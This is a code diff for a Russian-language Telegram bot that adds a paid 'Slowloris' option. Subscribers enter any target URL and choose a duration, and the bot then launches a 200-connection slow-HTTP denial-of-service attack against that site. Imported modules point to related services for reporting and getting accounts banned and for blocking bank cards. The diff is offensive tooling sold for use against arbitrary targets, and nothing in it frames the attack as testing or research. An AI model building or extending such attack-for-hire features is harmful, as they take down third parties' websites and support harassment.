@@ -27,6 +27,7 @@ from aureport_snos import main_aureport, set_bot_aureport
 from tida_snos import main_tida, set_bot_tida
 from bank_snos import process_bank_report, set_bot_bank
 from dsa_snos import main_dsa_snos, set_bot_dsa
+from slowloris import main_slowloris, set_bot_slowloris
 import db
 
 channel_id = config.channel_id
@@ -81,6 +82,7 @@ last_used_aureport = {}
 last_used_tida = {}
 last_used_bank = {}
 last_used_dsa = {}
+last_used_slowloris = {}
 user_requests = {}
 REQUEST_LIMIT = 3
 TIME_FRAME = 1
@@ -231,6 +233,9 @@ class WaitDsaFSM(StatesGroup):
 	sub_reason = State()
 	text = State()
 	text_confirm = State()
+
+class WaitSlowlorisFSM(StatesGroup):
+	url = State()
 
 class WaitBankFSM(StatesGroup):
 	card = State()
@@ -1562,6 +1567,47 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 					caption=f">❌ *Ошибка логгера: сервер недоступен*",
 					parse_mode="MarkdownV2", reply_markup=back_markup)
 
+		# ─── Slowloris ────────────────────────────────────────────────────────────
+		elif d == "slowloris_method":
+			if bot_off():
+				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id, caption=">❌ *Бот выключен\!*", parse_mode="MarkdownV2", reply_markup=back_markup); return
+			if sub_expired():
+				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id, caption=">❌ *Нужна подписка\!*", parse_mode="MarkdownV2", reply_markup=back_markup); return
+			# Показываем выбор времени (премиум видит 1ч)
+			time_markup = keyboards.slowloris_time_prem_markup if premium == 1 else keyboards.slowloris_time_markup
+			await dp_instance.current_state(chat=uid, user=uid).set_state(WaitSlowlorisFSM.url.state)
+			await dp_instance.current_state(user=uid).update_data(_bot_token=_instance_token)
+			await bot_instance.edit_message_caption(
+				call.message.chat.id, call.message.message_id,
+				caption=(
+					"⚡️ *Slowloris*\n\n"
+					"*└─ Введите URL цели:*\n\n"
+					"`https://example.com`"
+				),
+				parse_mode="Markdown", reply_markup=back_markup
+			)
+
+		elif d.startswith("slowloris_time_"):
+			await call.answer()
+			duration = int(d.split("_")[2])
+			fsm_data = await dp_instance.current_state(user=uid).get_data()
+			target_url = fsm_data.get("slowloris_url", "")
+			_bot_token = fsm_data.get("_bot_token")
+			_is_mirror = bool(_bot_token and _bot_token != config.TOKEN)
+			_bot = Bot(token=_bot_token) if _is_mirror else bot
+			await dp_instance.current_state(chat=uid, user=uid).finish()
+
+			if uid not in admins:
+				last_used_slowloris[uid] = now_msk()
+
+			try:
+				set_bot_slowloris(_bot)
+				asyncio.ensure_future(main_slowloris(target_url, uid, username or "None",
+					connections=200, duration=duration))
+			except Exception as e:
+				await _bot.send_message(uid, f"❌ *Ошибка Slowloris:* `{str(e)[:100]}`",
+					parse_mode="Markdown", reply_markup=main_menu)
+
 		# ─── Блокировка карты ─────────────────────────────────────────────────
 		elif d == "bank_method":
 			if bot_off():
@@ -2117,6 +2163,40 @@ async def dsa_custom_text(message: types.Message, state: FSMContext):
 	await state.finish()
 
 	await _dsa_launch(uid, _bot, fsm_data, state)
+
+
+@dp.message_handler(state=WaitSlowlorisFSM.url)
+async def slowloris_url_step(message: types.Message, state: FSMContext):
+	"""Пользователь ввёл URL — показываем выбор времени."""
+	uid = message.from_user.id
+	username = message.from_user.username or "None"
+	raw = message.text.strip()
+	fsm_data = await state.get_data()
+	_bot_token = fsm_data.get('_bot_token')
+	_is_mirror = bool(_bot_token and _bot_token != config.TOKEN)
+	_bot = Bot(token=_bot_token) if _is_mirror else bot
+
+	# Добавляем http если нет
+	if not raw.startswith("http"):
+		raw = "http://" + raw
+
+	await state.update_data(slowloris_url=raw)
+
+	# Определяем премиум
+	user_data = await db.get_user(uid)
+	prem = int(user_data['premium']) if user_data else 0
+	time_markup = keyboards.slowloris_time_prem_markup if prem == 1 or uid in admins else keyboards.slowloris_time_markup
+
+	await _bot.send_message(uid,
+		f"⚡️ *Slowloris*\n\n"
+		f"*Цель:* `{raw}`\n\n"
+		f"*Выберите длительность атаки:*",
+		parse_mode="Markdown", reply_markup=time_markup)
+
+	if _is_mirror:
+		try:
+			s = await _bot.get_session(); await s.close()
+		except Exception: pass
 
 
 @dp.message_handler(state=WaitTidaFSM.link)
